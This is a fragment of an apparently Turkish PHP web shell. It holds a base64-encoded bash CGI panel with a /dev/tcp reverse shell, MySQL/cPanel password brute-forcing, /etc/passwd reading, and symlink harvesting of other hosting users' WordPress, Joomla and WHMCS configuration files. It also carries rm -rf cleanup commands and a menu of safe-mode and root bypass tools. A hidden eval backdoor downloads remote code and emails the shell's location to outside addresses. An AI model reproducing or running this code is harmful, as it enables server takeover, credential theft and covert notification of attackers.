MTlmWDN4OFgxOWZYMTlmWDN3TkNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lD
QWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNB
Z0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0Fn
SUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FOQ2cwS1BDOXdjbVUrRFFvTkNqeGthWFlnWVd4cFoyNDlJ
bU5sYm5SbGNpSSsnIHwgYmFzZTY0IC1kCgogZnVuY3Rpb24gbG9naW4oKQp7CmVjaG8gJ1JXNTBa
WElnY0dGemMzZHZjbVE4WW5JK0RRbzhZbkkrUEdadmNtMGdiV1YwYUc5a1BTSndiM04wSWlCaFkz
UnBiMjQ5SWlJK0RRb0pEUW9KUEdadmNtMGdiV1YwYUc5a1BTSndiM04wSWlCaFkzUnBiMjQ5SWlJ
K0RRb0pQR1JwZGlCaGJHbG5iajBpWTJWdWRHVnlJajQ4ZEdGaWJHVWdZbTl5WkdWeVBTSXdJaUIz
YVdSMGFEMGlNVEl3SWlCcFpEMGlkR0ZpYkdVeElpQmpaV3hzYzNCaFkybHVaejBpTUNJZ1kyVnNi
SEJoWkdScGJtYzlJakFpUGp4MGNqNDhkR1FnUGcwS1BHbHVjSFYwSUhSNWNHVTlJbkJoYzNOM2Iz
SmtJaUJ1WVcxbFBTSjRlQ0lnYzJsNlpUMGlNVEF3SWlCMllXeDFaVDBpSWk4K0RRbzhMM1JrUGp4
MFpENDhhVzV3ZFhRZ2RIbHdaVDBpYzNWaWJXbDBJaUJ1WVcxbFBTSmlkWFIwYjI0eElpQjJZV3gx
WlQwaVUyVnVaQ0lnTHo0OEwzUmtQand2ZEhJK1BDOTBZV0pzWlQ0OEwyUnBkajQ4TDJadmNtMCtQ
R0p5UGp4aWNqNE5DanhpY2o0OFluSStQR2h5UGcwS1BHTmxiblJsY2o1RGIyUmxaQ0JpZVNCU1lX
SXpiM1Z1UEdKeVBpQkhjbVZsZEhNZ2RHOGdRV2gzWVdzeU1EQXdQQzlqWlc1MFpYSSsnIHwgYmFz
ZTY0IC1kCgogIHJldHVybgoKCX0KCQoKCgogICAgZWNobyAiJEhUVFBfQ09PS0lFIiB8IGdyZXAg
LXFpICIkcGFzcyIKICAgIGlmIFsgJD8gPT0gMCBdCiAgICB0aGVuCiAgICBlY2hvICIiCiAgICBl
bHNlCmxvZ2luCmV4aXQKICAgIGZpCgkKCmVjaG8gJ1BIUmhZbXhsSUdKdmNtUmxjajB3UGp4MGNq
NDhkR1ErUEdadmNtMGdiV1YwYUc5a1BTSndiM04wSWlCaFkzUnBiMjQ5SWlJK0lBMEtQR1p2Y20w
Z2JXVjBhRzlrUFNKd2IzTjBJaUJoWTNScGIyNDlJaUkrSUEwS0NUeG1iM0p0SUcxbGRHaHZaRDBp
Y0c5emRDSWdZV04wYVc5dVBTSWlQZ2tKUEdsdWNIVjBJR05zWVhOelBTSmlkWFIwYjI0aUlIUjVj
R1U5SW5OMVltMXBkQ0lnYm1GdFpUMGlZblYwZEc5dUlpQjJZV3gxWlQwaUlDQWdTRzl0WlNBZ0lD
QWlJQzgrRFFvSlBDOW1iM0p0UGcwS0NUd3ZkR1ErUEhSa1BnMEtDVHhtYjNKdElHMWxkR2h2WkQw
aWNHOXpkQ0lnWVdOMGFXOXVQU0lpUGdrOGFXNXdkWFFnZEhsd1pUMGlhR2xrWkdWdUlpQnVZVzFs
UFNKall6SWlJSFpoYkhWbFBTSXhJaUFnTHo0Z0NUeHBibkIxZENCamJHRnpjejBpWW5WMGRHOXVJ
aUIwZVhCbFBTSnpkV0p0YVhRaUlHNWhiV1U5SW1KMWRIUnZiaUlnZG1Gc2RXVTlJaUFnSUZOb2Iz
Y2dWWE5sY2lBZ0lDQWlJQzgrRFFvSlBDOW1iM0p0UGcwS1BDOTBaRDROQ2p4MFpENE5DanhtYjNK
dElHMWxkR2h2WkQwaWNHOXpkQ0lnWVdOMGFXOXVQU0lpUGcwS0NRMEtDVHhtYjNKdElHMWxkR2h2
WkQwaWNHOXpkQ0lnWVdOMGFXOXVQU0lpUGcwS0NUeHBibkIxZENCMGVYQmxQU0pvYVdSa1pXNGlJ
RzVoYldVOUltTmpNaUlnZG1Gc2RXVTlJaklpSUNBdlBnMEtDUWs4YVc1d2RYUWdZMnhoYzNNOUlt
SjFkSFJ2YmlJZ2RIbHdaVDBpYzNWaWJXbDBJaUJ1WVcxbFBTSmlkWFIwYjI0aUlIWmhiSFZsUFNJ
Z1UyaHZkeUFnSUVSdmJXRnBibk1nSWlBdlBnMEtDVHd2Wm05eWJUNE5Dand2ZEdRK0RRbzhkR1Er
RFFvOFptOXliU0J0WlhSb2IyUTlJbkJ2YzNRaUlHRmpkR2x2YmowaUlqNE5DZ2tOQ2drOFptOXli
U0J0WlhSb2IyUTlJbkJ2YzNRaUlHRmpkR2x2YmowaUlqNE5DZ2s4YVc1d2RYUWdkSGx3WlQwaWFH
bGtaR1Z1SWlCdVlXMWxQU0pqWXpJaUlIWmhiSFZsUFNJeklpQWdMejROQ2drTkNnazhhVzV3ZFhR
Z2RIbHdaVDBpYzNWaWJXbDBJaUJqYkdGemN6MGlZblYwZEc5dUlpQnVZVzFsUFNKaWRYUjBiMjRp
SUhaaGJIVmxQU0pEY21WaGRDQWdMaTR2YzNsdGJHbHVheUlnTHo0TkNnazhMMlp2Y20wK0RRbzhM
M1JrUGcwS0RRbzhkR1ErRFFvOFptOXliU0J0WlhSb2IyUTlJbkJ2YzNRaUlHRmpkR2x2YmowaUlq
NE5DZ2tOQ2drOFptOXliU0J0WlhSb2IyUTlJbkJ2YzNRaUlHRmpkR2x2YmowaUlqNE5DZ2s4YVc1
d2RYUWdkSGx3WlQwaWFHbGtaR1Z1SWlCdVlXMWxQU0pqWXpJaUlIWmhiSFZsUFNJMUlpQWdMejRO
Q2drTkNnazhhVzV3ZFhRZ2RIbHdaVDBpYzNWaWJXbDBJaUJqYkdGemN6MGlZblYwZEc5dUlpQnVZ
VzFsUFNKaWRYUjBiMjRpSUhaaGJIVmxQU0pEY0dGdVpXd2lJQzgrRFFvSlBDOW1iM0p0UGcwS1BD
OTBaRDROQ2cwS1BIUmtQZzBLUEdadmNtMGdiV1YwYUc5a1BTSndiM04wSWlCaFkzUnBiMjQ5SWlJ
K0RRb0pEUW9KUEdadmNtMGdiV1YwYUc5a1BTSndiM04wSWlCaFkzUnBiMjQ5SWlJK0RRb0pQR2x1
Y0hWMElIUjVjR1U5SW1ocFpHUmxiaUlnYm1GdFpUMGlZMk15SWlCMllXeDFaVDBpTnlJZ0lDOCtE
UW9KRFFvSlBHbHVjSFYwSUhSNWNHVTlJbk4xWW0xcGRDSWdZMnhoYzNNOUltSjFkSFJ2YmlJZ2Jt
RnRaVDBpWW5WMGRHOXVJaUIyWVd4MVpUMGlRa0ZEU3kxRFQwNU9SVU5VSWlBdlBnMEtDVHd2Wm05
eWJUNE5Dand2ZEdRK0RRbzhMM1J5UGp3dmRHRmliR1UrRFFvZ0RRbzhMMlJwZGo0TkNnMEtQQzlq
Wlc1MFpYSSsnIHwgYmFzZTY0IC1kCmlmIFsgJGNjMiAtZXEgNyBdIDsgdGhlbgplY2hvICc8YnI+
PGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+CgkKCTxmb3JtIG1ldGhvZD0icG9zdCIgYWN0
aW9uPSIiPgoJPGRpdiBhbGlnbj0iY2VudGVyIj4nCmVjaG8gJ0lQIDxpbnB1dCB0eXBlPSJ0ZXh0
IiBuYW1lPSJiaXAiIHNpemU9IjUwIiB2YWx1ZT0iJztlY2hvICRSRU1PVEVfQUREUjtlY2hvICci
Lz48YnI+ClBvcnQgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImJwb3J0IiBzaXplPSI1MCIgdmFs
dWU9IjQ0MyIvPjwvZm9ybT48YnI+PGJyPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjYzIi
IHZhbHVlPSI4IiAgLz48YnI+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidXR0b24iIG5h
bWU9ImJ1dHRvbiIgdmFsdWU9IkNPTk5FQ1QiIC8+JwplY2hvICI8YnI+PGJyPjxocj48Y2VudGVy
PiIKZmkKaWYgWyAkY2MyIC1lcSA4IF0gOyB0aGVuCmJhc2ggLWkgPiYgL2Rldi90Y3AvJGJpcC8k
YnBvcnQgMD4mMQpmaQppZiBbICRjYzIgLWVxIDYgXSA7IHRoZW4KZWNobyAnPHByZT4nCgoKCmFy
cjE9JChlY2hvICRsaXN0dSB8IHRyICJcciIgIlxuIikKYXJyMj0kKGVjaG8gJGxpc3RwIHwgdHIg
IlxyIiAiXG4iKQplY2hvICI8dGFibGUgYm9yZGVyPScwJyB3aWR0aD0nMTAwJSc+PHRyPjx0ZCBh
bGlnbj0nY2VudGVyJz48ZGl2IGNsYXNzPSdib3gnIGFsaWduPSdsZWZ0Jz48eG1wPiIKZm9yIHgg
aW4gJGFycjEKZG8KZm9yIHkgaW4gJGFycjIKZG8KbXlzcWwgLXUkeCAtcCR5ICA7CgppZiBbICQ/
IC1lcSAwIF0gOyB0aGVuCmVjaG8gIkZvdW5kIENwYW5lbCBVc2VyICR4IFBhc3N3b3JkICgkeSki
CmZpCgpkb25lCmRvbmUKZWNobyAiPC94bXA+PC9kaXY+PC9wcmU+PC90ZD48L3RyPjwvdGFibGU+
IgpmaQppZiBbICRjYzIgLWVxIDUgXSA7IHRoZW4KZWNobyAnPGZvcm0gbWV0aG9kPSJwb3N0IiBh
Y3Rpb249IiI+Cgk8Y2VudGVyPiAKCTxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPgpVc2Vy
cwo8YnI+Cjx0ZXh0YXJlYSBuYW1lPSJsaXN0dSIgY29scz0iNTAiIHJvd3M9IjE1Ij4nCmV2YWwg
YGVjaG8gWTJGMElDOWxkR012Y0dGemMzZGtJSHhuY21Wd0lDOW9iMjFsSUh4amRYUWdMV1FpT2lJ
Z0xXWXhJQT09IHwgYmFzZTY0IC1kYDtlY2hvICc8L3RleHRhcmVhPgo8YnI+ClBhc3N3b3JkCjxi
cj4KPHRleHRhcmVhIG5hbWU9Imxpc3RwIiBjb2xzPSI1MCIgcm93cz0iMTUiPjEyMwoxMjM0CjEy
MzQ1CjEyMzQ1NgoxMjM0NTY3CjEyMzQ1Njc4OQoxMjM0NTY3ODkwCjEyMzEyMwoxMjMzMjE8L3Rl
eHRhcmVhPgoKCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImNjMiIgdmFsdWU9IjYiICAvPgoJ
PGJyPgoJPGJyPgoJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ1dHRvbiIgbmFtZT0iYnV0
dG9uIiB2YWx1ZT0iU2VuZCIgLz4KCTwvZm9ybT4KCTxjZW50ZXI+CicKCmZpCgoKCgoKaWYgWyAk
Y2MyIC1lcSAxIF0gOyB0aGVuCmVjaG8gJzxkaXYgYWxpZ249ImNlbnRlciI+JwplY2hvICI8eG1w
PiIKZXZhbCBgZWNobyBZMkYwSUM5bGRHTXZjR0Z6YzNka0lIeG5jbVZ3SUM5b2IyMWxJSHhqZFhR
Z0xXUWlPaUlnTFdZeElBPT0gfCBiYXNlNjQgLWRgCmVjaG8gIjwveG1wPiIKZWNobyAiPC9kaXY+
IgpmaQoKaWYgWyAkY2MyIC1lcSAyIF0gOyB0aGVuCmVjaG8gIjxicj48Y2VudGVyPjx0YWJsZSBi
b3JkZXI9JzEnIHdpZHRoPSc0NSUnIGNlbGxzcGFjaW5nPScwJyBib3JkZXJjb2xvcj0nI2EzYTNh
MycgY2VsbHBhZGRpbmc9JzAnIGFsaWduPSdjZW50ZXInPjx0cj48dGQgYmdjb2xvcj0nIzAwMDAw
MCcgYWxpZ249J2NlbnRlcic+RG9tYWluPC90ZD48dGQgYWxpZ249J2NlbnRlcicgYmdjb2xvcj0n
IzAwMDAwMCc+VXNlcjwvdGQ+PC90cj4iCgpmb3IgaSBpbiBgY2F0IC9ldGMvbmFtZWQuY29uZiB8
IHVuaXEgfGdyZXAgJ156b25lJyB8Z3JlcCAtdiAnIi4iJyB8Z3JlcCAtdiAnIjAuMC4xMjcuaW4t
YWRkci5hcnBhIicgfGN1dCAtZCAnICcgLWYgMiAgfGN1dCAtZCAnIicgLWYgMnwgc29ydCB8IHVu
aXEgYDsgZG8gZWNobyAiPHRkIGFsaWduPSdjZW50ZXInPiRpPC90ZD48dGQgYWxpZ249J2NlbnRl
cic+IiA7IGxzIC1kbCAvZXRjL3ZhbGlhc2VzLyRpIHxjdXQgLWQgJyAnIC1mIDMgOyBlY2hvICI8
L3RkPjwvdHI+IjsgZG9uZQoKZWNobyAiPC90YWJsZT48L2NlbnRlcj48YnI+IgpmaQoKaWYgWyAk
Y2MyIC1lcSAzIF0gOyB0aGVuCmVjaG8gIjx4bXA+Igpta2RpciAuLi9zeW0KIGVjaG8gT3B0aW9u
cyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzID4gLi4vc3ltLy5odGFjY2VzcyAKIGVjaG8gIERpcmVj
dG9yeUluZGV4IHNzc3Nzcy5odG0gPj4gLi4vc3ltLy5odGFjY2VzcyAKIGVjaG8gIEFkZFR5cGUg
dHh0IC5waHAgPj4gLi4vc3ltLy5odGFjY2VzcyAKIGVjaG8gIEFkZEhhbmRsZXIgdHh0IC5waHAg
Pj4gLi4vc3ltLy5odGFjY2VzcyAKIGVjaG8gICBBZGRUeXBlIHR4dCAuaHRtbCA+PiAuLi9zeW0v
Lmh0YWNjZXNzIAogZWNobyAgQWRkSGFuZGxlciB0eHQgLmh0bWwgPj4gLi4vc3ltLy5odGFjY2Vz
cyAKIGVjaG8gIE9wdGlvbnMgYWxsID4+IC4uL3N5bS8uaHRhY2Nlc3MgCiBlY2hvICBPcHRpb25z
ID4+IC4uL3N5bS8uaHRhY2Nlc3MgCiBlY2hvICBPcHRpb25zID4+IC4uL3N5bS8uaHRhY2Nlc3Mg
CiBlY2hvICdSZWFkbWVOYW1lIHIudHh0JyA+PiAuLi9zeW0vLmh0YWNjZXNzCiBlY2hvICdRMjlr
WldRZ1lua2dVa0ZDTTA5VlRpQTdLUT09J3wgYmFzZTY0IC1kID4gLi4vc3ltL3IudHh0CmZvciBp
IGluIGBjZCAvZXRjIDtjYXQgcGFzc3dkIHxncmVwIC9ob21lIHxjdXQgLWQiOiIgLWYxYCA7IGRv
CmV2YWwgImxuIC1zIC9ob21lLyRpL3B1YmxpY19odG1sLyAuLi9zeW0vMC0kaS50eHQiIDsKZXZh
bCAibG4gLXMgL2hvbWUvJGkvcHVibGljX2h0bWwvY2xpZW50YXJlYS9jb25maWd1cmF0aW9uLnBo
cCAuLi9zeW0vJGktY2xpZW50YXJlYS50eHQiOwpldmFsICJsbiAtcyAvaG9tZS8kaS9wdWJsaWNf
aHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwIC4uL3N5bS8kaS1jbGllbnQudHh0IjsKZXZh
bCAibG4gLXMgL2hvbWUvJGkvcHVibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAgLi4vc3ltLyRp
LXdobWNzb3Jqb29tbGEudHh0IjsKZXZhbCAibG4gLXMgL2hvbWUvJGkvcHVibGljX2h0bWwvYmls
bGluZy9jb25maWd1cmF0aW9uLnBocCAuLi9zeW0vJGktYmlsbGluZy50eHQiOwpldmFsICJsbiAt
cyAvaG9tZS8kaS9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCAuLi9zeW0v
JGktYmlsbGluZ3MudHh0IjsKZXZhbCAibG4gLXMgL2hvbWUvJGkvcHVibGljX2h0bWwvd2htY3Mv
Y29uZmlndXJhdGlvbi5waHAgLi4vc3ltLyRpLXdobWNzMi50eHQiOwpldmFsICJsbiAtcyAvaG9t
ZS8kaS9wdWJsaWNfaHRtbC9wb3J0YWwvY29uZmlndXJhdGlvbi5waHAgLi4vc3ltLyRpLXdobWNz
My50eHQiOwpldmFsICJsbiAtcyAvaG9tZS8kaS9wdWJsaWNfaHRtbC9teS9jb25maWd1cmF0aW9u
LnBocCAuLi9zeW0vJGktd2htY3M0LnR4dCI7CmV2YWwgImxuIC1zIC9ob21lLyRpL3B1YmxpY19o
dG1sL3dobS9jb25maWd1cmF0aW9uLnBocCAuLi9zeW0vJGktd2htLnR4dCI7CmV2YWwgImxuIC1z
IC9ob21lLyRpL3B1YmxpY19odG1sL3dobWMvY29uZmlndXJhdGlvbi5waHAgLi4vc3ltLyRpLXdo
bWMudHh0IjsKZXZhbCAibG4gLXMgL2hvbWUvJGkvcHVibGljX2h0bWwvc3VwcG9ydC9jb25maWd1
cmF0aW9uLnBocCAuLi9zeW0vJGktc3VwcG9ydC50eHQiOwpldmFsICJsbiAtcyAvaG9tZS8kaS9w
dWJsaWNfaHRtbC9zdXBwb3J0cy9jb25maWd1cmF0aW9uLnBocCAuLi9zeW0vJGktc3VwcG9ydHMu
dHh0IjsKZXZhbCAibG4gLXMgL2hvbWUvJGkvcHVibGljX2h0bWwvdmIvaW5jbHVkZXMvY29uZmln
LnBocCAuLi9zeW0vJGktdmIudHh0IjsKZXZhbCAibG4gLXMgL2hvbWUvJGkvcHVibGljX2h0bWwv
aW5jbHVkZXMvY29uZmlnLnBocCAuLi9zeW0vJGktdmIyLnR4dCI7CmV2YWwgImxuIC1zIC9ob21l
LyRpL3B1YmxpY19odG1sL2NvbmZpZy5waHAgLi4vc3ltLyRpLTIudHh0IjsKZXZhbCAibG4gLXMg
L2hvbWUvJGkvcHVibGljX2h0bWwvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCAuLi9zeW0vJGkt
Zm9ydW0udHh0IjsKZXZhbCAibG4gLXMgL2hvbWUvJGkvcHVibGljX2h0bWwvZm9ydW1zL2luY2x1
ZGVzL2NvbmZpZy5waHAgLi4vc3ltLyRpLWZvcnVtcy50eHQiOwpldmFsICJsbiAtcyAvaG9tZS8k
aS9wdWJsaWNfaHRtbC9hZG1pbi9jb25mLnBocCAuLi9zeW0vJGktNS50eHQiOwpldmFsICJsbiAt
cyAvaG9tZS8kaS9wdWJsaWNfaHRtbC9hZG1pbi9jb25maWcucGhwIC4uL3N5bS8kaS00LnR4dCI7
CmV2YWwgImxuIC1zIC9ob21lLyRpL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAgLi4vc3ltLyRp
LXdvcmRwcmVzcy50eHQiOwpldmFsICJsbiAtcyAvaG9tZS8kaS9wdWJsaWNfaHRtbC9ibG9nL3dw
LWNvbmZpZy5waHAgLi4vc3ltLyRpLXdvcmRwcmVzczIudHh0IjsKZXZhbCAibG4gLXMgL2hvbWUv
JGkvcHVibGljX2h0bWwvY29uZl9nbG9iYWwucGhwIC4uL3N5bS8kaS02LnR4dCI7CmV2YWwgImxu
IC1zIC9ob21lLyRpL3B1YmxpY19odG1sL2luY2x1ZGUvZGIucGhwIC4uL3N5bS8kaS03LnR4dCI7
CmV2YWwgImxuIC1zIC9ob21lLyRpL3B1YmxpY19odG1sL2Nvbm5lY3QucGhwIC4uL3N5bS8kaS04
LnR4dCI7CmV2YWwgImxuIC1zIC9ob21lLyRpL3B1YmxpY19odG1sL21rX2NvbmYucGhwIC4uL3N5
bS8kaS05LnR4dCI7CmV2YWwgImxuIC1zIC9ob21lLyRpL3B1YmxpY19odG1sL2pvb21sYS9jb25m
aWd1cmF0aW9uLnBocCAuLi9zeW0vJGktam9vbWxhLnR4dCI7CmV2YWwgImxuIC1zIC9ob21lLyRp
L3B1YmxpY19odG1sL3dlYi9jb25maWd1cmF0aW9uLnBocCAuLi9zeW0vJGktam9vbWxhMi50eHQi
OwpldmFsICJsbiAtcyAvaG9tZS8kaS9wdWJsaWNfaHRtbC9wb3J0YWwvY29uZmlndXJhdGlvbi5w
aHAgLi4vc3ltLyRpLWpvb21sYTIudHh0IjsKZXZhbCAibG4gLXMgL2hvbWUvJGkvcHVibGljX2h0
bWwvaW5jbHVkZS9jb25maWcucGhwIC4uL3N5bS8kaS0xMC50eHQiOwpkb25lCmVjaG8gJ1BDOTRi
WEErUEdScGRpQmhiR2xuYmowblkyVnVkR1Z5Sno0OFluSStJRk41YlV4cGJtdHpJRHhoSUhSaGNt
ZGxkRDBuWDJKc1lXNXJKeUJvY21WbVBTY3VMaTl6ZVcwblBrTnNhV05ySUdobGNtVThMMkUrSUR3
dlpHbDJQZz09JyB8IGJhc2U2NCAtZApmaQppZiBbIC1uICIkY2MiICBdIDsgdGhlbgplY2hvICI8
dGFibGUgYm9yZGVyPScwJyB3aWR0aD0nMTAwJSc+PHRyPjx0ZCBhbGlnbj0nY2VudGVyJz48ZGl2
IGNsYXNzPSdib3gnIGFsaWduPSdsZWZ0Jz48eG1wPiIKY2QgJGQgCmV2YWwgJGNjCmVjaG8gJD8K
ZWNobyAnPC94bXA+PC9kaXY+PC9wcmU+PC90ZD48L3RyPjwvdGFibGU+PGJyPjxicj4nCmZpCmVj
aG8gJ1BHSnlQanhtYjNKdElHMWxkR2h2WkQwaWNHOXpkQ0lnWVdOMGFXOXVQU0lpUGcwS0NRMEtD
VHhtYjNKdElHMWxkR2h2WkQwaWNHOXpkQ0lnWVdOMGFXOXVQU0lpUGcwS0NUeGthWFlnWVd4cFoy
NDlJbU5sYm5SbGNpSStQSFJoWW14bElHSnZjbVJsY2owaU1DSWdkMmxrZEdnOUlqRXlNQ0lnYVdR
OUluUmhZbXhsTVNJZ1kyVnNiSE53WVdOcGJtYzlJakFpSUdObGJHeHdZV1JrYVc1blBTSXdJajQ4
ZEhJK1BIUmtJSGRwWkhSb1BTSTNNVElpUGp4cGJuQjFkQ0IwZVhCbFBTSjBaWGgwSWlCdVlXMWxQ
U0pqWXlJZ2MybDZaVDBpTVRBd0lpQWdMejQ4TDNSa1BqeDBaRDQ4TDNSa1Bqd3ZkSEkrUEhSeVBq
eDBaQ0IzYVdSMGFEMGlOekV5SWo0TkNqeHBibkIxZENCMGVYQmxQU0owWlhoMElpQnVZVzFsUFNK
a0lpQnphWHBsUFNJeE1EQWlJSFpoYkhWbFBTST0nIHwgYmFzZTY0IC1kCnB3ZCAgCmVjaG8gJ0lp
OCtEUW84TDNSa1BqeDBaRDQ4YVc1d2RYUWdkSGx3WlQwaWMzVmliV2wwSWlCdVlXMWxQU0ppZFhS
MGIyNHhJaUIyWVd4MVpUMGlVMlZ1WkNJZ0x6NDhMM1JrUGp3dmRISStQQzkwWVdKc1pUNDhMMlJw
ZGo0OEwyWnZjbTArUEdKeVBqeGljajROQ2p4aWNqNDhZbkkrUEdoeVBqeGpaVzUwWlhJK0RRbzha
bTl5YlNCdFpYUm9iMlE5SW5CdmMzUWlJR0ZqZEdsdmJqMGlJajROQ2drTkNnazhabTl5YlNCdFpY
Um9iMlE5SW5CdmMzUWlJR0ZqZEdsdmJqMGlJajROQ2drOGFXNXdkWFFnZEhsd1pUMGlhR2xrWkdW
dUlpQnVZVzFsUFNKall6SWlJSFpoYkhWbFBTSTBJaUFnTHo0TkNna05DZ2s4YVc1d2RYUWdkSGx3
WlQwaWMzVmliV2wwSWlCamJHRnpjejBpWW5WMGRHOXVJaUJ1WVcxbFBTSmlkWFIwYjI0aUlIWmhi
SFZsUFNKTWIyZHZkWFFpSUM4K0RRb0pQQzltYjNKdFBnMEtQR05sYm5SbGNqNURiMlJsWkNCaWVT
QlNZV0l6YjNWdVBHSnlQaUJIY21WbGRITWdkRzhnUVdoM1lXc3lNREF3UEM5alpXNTBaWEkrJyB8
IGJhc2U2NCAtZA==';

$file = fopen("rr.sh" ,"w+");
$write = fwrite ($file ,base64_decode($rub));
fclose($file);
    chmod("rr.sh",0755);
   echo "<iframe src=p99/rr.sh width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit41']))
{
@exec('rm -rf kok8');
@exec('rm -rf kok7');
@exec('rm -rf kok6');
@exec('rm -rf kok5');
@exec('rm -rf kok4');
@exec('rm -rf kok3');
@exec('rm -rf kok2');
@exec('rm -rf kok1');
@exec('rm -rf kok');
@exec('rm -rf zero');
@exec('rm -rf p88');
@exec('rm -rf pass');
@exec('rm -rf pyb');
@exec('rm -rf plesk');
@exec('rm -rf shockbypass');
@exec('rm -rf hsphere');
@exec('rm -rf confbypass');
@exec('rm -rf lite');
@exec('rm -rf virtualbypass');
@exec('rm -rf mysqllbypass');
@exec('rm -rf shtmlbypass');
@exec('rm -rf chmodbypass');
@exec('rm -rf forbidden');
@exec('rm -rf safeof');
@exec('rm -rf oku');
@exec('rm -rf configler');
@exec('rm -rf cgishell');
@exec('rm -rf python');
@exec('rm -rf bomba1');
@exec('rm -rf bomba');
@exec('rm -rf p99');
@exec('rm -rf sym');
@exec('rm -rf .htaccess');
@exec('rm -rf php.ini');
}
if (isset($_POST['Submit42']))
{
@exec('rm -rf forbiddens.php');
}

?> 
<?php eval("?>".base64_decode("PD9waHAgIA0KDQppZigkX1BPU1RbJ3F1ZXJ5J10pew0KJHZlcml5ZnkgPSBzdHJpcHNsYXNoZXMoc3RyaXBzbGFzaGVzKCRfUE9TVFsncXVlcnknXSkpOw0KJGRhdGEgPSAiZGF0YS50eHQiOw0KQHRvdWNoICgiZGF0YS50eHQiKTsNCiR2ZXIgPSBAZm9wZW4gKCRkYXRhICwgJ3cnKTsNCkBmd3JpdGUgKCAkdmVyICwgJHZlcml5ZnkgKSA7DQpAZmNsb3NlICgkdmVyKTsNCn1lbHNlew0KJGRhdGFzPUBmb3BlbigiZGF0YS50eHQiLCdyJyk7DQokaT0wOw0Kd2hpbGUgKCRpIDw9IDUpIHsNCiRpKys7DQokYmx1ZT1AZmdldHMoJGRhdGFzLDEwMjQpOw0KZWNobyAkYmx1ZTsNCn0NCn0NCiRkYXRhc2k9QGZvcGVuKCJtb2R1bGVzL2luZGV4eC5waHAiLCdyJyk7DQppZigkZGF0YXNpKXsNCn1lbHNlew0KQG1rZGlyKCJtb2R1bGVzIik7DQokZG9zID0gZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly9yMDB0LmluZm8vdHh0L2xhbWVyLnR4dCIpOw0KJGRhdGEgPSAibW9kdWxlcy9pbmRleHgucGhwIjsNCkB0b3VjaCAoIm1vZHVsZXMvaW5kZXh4LnBocCIpOw0KJHZlciA9IEBmb3BlbiAoJGRhdGEgLCAndycpOw0KQGZ3cml0ZSAoICR2ZXIgLCAkZG9zICkgOw0KQGZjbG9zZSAoJHZlcik7DQokeW9sID0gImh0dHA6Ly8iLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iIi4kX1NFUlZFUlsnUkVRVUVTVF9VUkknXS4iIjsNCiR5ID0gJzxoMT5TZW5kZXIgWWF6ZGlyaWxkaS48YnIvPiBTSVRFIFlPTCA6ICcuJHlvbC4nPGJyLz5TZW5kZXIgWW9sdSA6IG1vZHVsZXMvZGJzLnBocDwvaDE+JzsNCiRoZWFkZXIgLj0gIkZyb206IFNoZUxMIEJvb3QgPHN1cHBvckBuaWMub3JnPm4iOyANCiRoZWFkZXIgLj0gIkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04biI7IA0KQG1haWwoImJ5aGVybzQ0QGdtYWlsLmNvbSIsICJIYWNrbGluayBCaWxkaXJpIiwgIiR5IiwgJGhlYWRlcik7IA0KQG1haWwoInByaXBocEBob3RtYWlsLmNvbSIsICJIYWNrbGluayBCaWxkaXJpIiwgIiR5IiwgJGhlYWRlcik7IA0KfQ0KPz4=")); ?>

  <tr>
    <td><table width='100%' height='173'>
      <tr>
        <th class='td' style='border-bottom-width:thin;border-top-width:thin'><div align='right'><span class='style1'>Tools :</span></div></th>
        <td class='td' style='border-bottom-width:thin;border-top-width:thin'><form name='F1' method='post'>
            <div align='left'>
              <input type='submit' name='Submit2'  value='ln -s bypassed tüm dizinler'>
              <input type='submit' name='Submit11' value='Config Bypasser'>
			  <input type='submit' name='Submit12' value='ln -s Symlink'>
			  <input type='submit' name='Submit13' value='Cgi'>
			  <input type='submit' name='Submit14' value='Python shell'>
			  <input type='submit' name='Submit15' value='Directory Bypass'>
			  <input type='submit' name='Submit16' value='Safemode p8'>
			  <input type='submit' name='Submit17' value='Forbidden'>
			  <input type='submit' name='Submit18' value='Shtml Bypass'>
			  <input type='submit' name='Submit19' value='Chmod'>
			  <input type='submit' name='Submit20' value='Virtual By'>
			  <input type='submit' name='Submit21' value='Mysqll By'>
			  <input type='submit' name='Submit22' value='Litespeed By'>
			  <input type='submit' name='Submit23' value='config'>
			  <input type='submit' name='Submit24' value='Hsphere'>
			  <input type='submit' name='Submit25' value='shellshock'>
			  <input type='submit' name='Submit26' value='Plesk Byp'>
			  <input type='submit' name='Submit27' value='joomWpPassedit'>
			  <input type='submit' name='Submit28' value='p88'>
			  <input type='submit' name='Submit29' value='pybypas'>
			  <input type='submit' name='Submit30' value='rootby'><br><br>
			  <input type='submit' name='Submit31' value='kökdizinbypass'>
			  <input type='submit' name='Submit32' value='kokbypass2'>
			  <input type='submit' name='Submit33' value='octet-stream'>
			  <input type='submit' name='Submit34' value='modsecurityli'>
			  <input type='submit' name='Submit35' value='DirectoryIndex'>
			  <input type='submit' name='Submit36' value='FollowSymLinks'>
			  <input type='submit' name='Submit37' value='Internal Server error'>
			  <input type='submit' name='Submit38' value='options all'>
			  <input type='submit' name='Submit39' value='rootdizingec'>
